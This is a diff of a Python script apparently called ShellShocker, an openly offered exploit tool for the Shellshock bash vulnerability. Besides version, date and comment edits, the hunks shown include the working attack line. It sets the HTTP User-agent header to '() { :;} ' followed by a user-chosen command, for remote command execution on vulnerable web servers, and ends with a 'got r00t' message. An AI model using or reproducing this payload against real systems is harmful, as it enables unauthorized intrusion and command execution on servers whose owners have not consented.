@@ -10,12 +10,12 @@
 #################################                  #
 
 # Stefano Belli <stefano9913@gmail.com> ][ Google+ : <http://plus.google.com/+StefanoBelli>
-# Last updated: [DD/MM/YYYY] 31/12/2014, [HH/MM] 03:14 PM
+# Last updated: [DD/MM/YYYY] 09/12/2014, [HH/MM] 14:44 PM
 # Status: initial release
 # support: posix (Unix) / Windows may require Cygwin[BATCH NOT SUPPORTED] due to unsupported things. Program runs.
-# Be free! Copyleft & Open Source <(C)
-# Version: 0.99.1
-# Status: BETA
+# Be free! Open Source <(C)
+# Version: 1.0
+# Status: WORKING
 
 #Modules
 import os
@@ -40,8 +40,8 @@ i ADVIDSED you.
 :::.::.:::.::.:..::.::::.....:::..:::.
 ========================================
 '''
-version = 0.991
-status = "Beta"
+version = 1
+status = "Working"
 
 __main__ = '''
 ShellShocker <(C) | Exploit (Shell)
@@ -71,7 +71,7 @@ ShellShocker <(C) | Exploit (Shell)
       Developer: Stefano belli (--developer for more info(s) )
       Script version: %s
       GitHub: <http://github.com/StefanoBelli/shellshocker-python>Term
-      Last updated: 31/12/2014 [DD/MM/YYYY] @ 3:15 PM
+      Last updated: 09/12/2014 [DD/MM/YYYY] @ 14:44 PM
 
 Usage: shellshock_exec_beta-devel.py <option>
 
@@ -132,6 +132,7 @@ try:
 except ImportError:
     os.system("clear")
     print("{!} Import error: mechanize libs are not installed!")
+    #Package manager chooser, install mechanize automatically if not availible (ImportError Exception)
     outOrGet = raw_input("{?} Do you want to exit or get mechanize[e/M]: ")
     if outOrGet == 'e':
         exit(1)
@@ -164,6 +165,7 @@ except ImportError:
             exitValue = 1
             exit(1)
 
+    #Check for Android 
     try:
         import androidhelper
     except ImportError:
@@ -172,6 +174,7 @@ except ImportError:
     else:
         print("{!} Mechanize don't supported. Application is begin builded (Java)")
         exit(1)
+#Define mechanize values
 def defineMechanize():
     global br
     try:
@@ -184,7 +187,7 @@ def defineMechanize():
             exit(1)
     br.addheaders = [('User-agent', '() { :;} %s'%getCommand)]
     
-
+#Main screen 
 def mainChooser():
     global getTarget
     global getCommand
@@ -203,6 +206,7 @@ def mainChooser():
         print("{!} Dev error! submit this error: mainChooser() SyntaxError [[ See my email address for more info (call --developer)")
         exit(0)
 
+#Attack
 def attacker():
     try:
         print ""
@@ -232,12 +236,9 @@ def attacker():
         else:
             print("Bye bye!\nAnd remember... \033[31mW00t W00t i got r00t!\033[0m")
             exit(0)
-
-
-class attackerCls():   
-    mainChooser()      
-    defineMechanize()  
-    attacker()         
-
-
-
+            
+####EXECUTE####
+mainChooser()     
+defineMechanize()  
+attacker()         
+###############
